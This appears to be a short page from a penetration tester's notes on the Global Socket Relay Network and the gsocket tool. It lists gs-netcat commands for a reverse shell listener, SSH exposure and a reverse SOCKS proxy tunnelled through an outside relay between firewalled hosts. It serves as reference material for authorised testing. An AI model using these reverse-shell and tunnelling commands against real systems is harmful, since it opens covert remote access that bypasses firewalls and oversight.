---
title: GSRN
---

[[notes/tunneling/index]] over the *Global Socket Relay Network*.
The network establishes an end-to-end encrypted TCP connection between two firewalled systems that can be used for a reverse [[notes/pivoting/socks-proxy]], [[notes/pivoting/port-forwarding]] and remote shell access.

[[notes/tools/gsocket]] is available as pre-compiled binary and as container `docker.io/hackerschoice/gsocket`.
[qsocket](https://github.com/qsocket/qsocket) is a reimplementation in Rust and Go with Windows support.

Open a reverse shell listener.

~~~ bash
gs-netcat -l -i -s $(uuidgen -r)
~~~

Connect to the reverse shell listener.

~~~ bash
gs-netcat -i -s $secret
~~~

Expose the SSH port over GSRN.

~~~ bash
gs-netcat -l -d 127.0.0.1 -p 22 -s $(uuidgen -r)
~~~

Connect to the SSH port over GSRN.

~~~ bash
gs-netcat -d 127.0.0.1 -p 2222 -s $secret
ssh -p 2222 127.0.0.1
~~~

Start a reverse SOCKS proxy.

~~~ bash
gs-netcat -l -S -s $(uuidgen -r)
~~~

Make the reverse SOCKS proxy available on `localhost:1080`.

~~~ bash
gs-netcat -d 127.0.0.1 -p 1080 -s $secret
~~~
